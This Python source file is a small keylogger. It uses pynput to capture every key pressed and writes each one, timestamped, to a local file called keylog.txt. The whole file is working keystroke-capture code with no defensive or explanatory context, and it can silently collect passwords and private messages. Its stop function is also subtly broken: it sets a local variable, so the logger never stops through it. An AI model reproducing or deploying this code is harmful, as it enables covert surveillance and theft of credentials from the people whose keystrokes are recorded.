from pynput.keyboard import Key, Listener
import logging
global listener_exit
listener_exit = False

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def proxy_start():
    start_listener()

def stop_listener():
    listener_exit = True

def on_press(key):
    if listener_exit:
        return False
    logging.info(str(key))


def start_listener():
    global listener_exit
    listener_exit = False
    with Listener(on_press=on_press) as listener:
        listener.join()
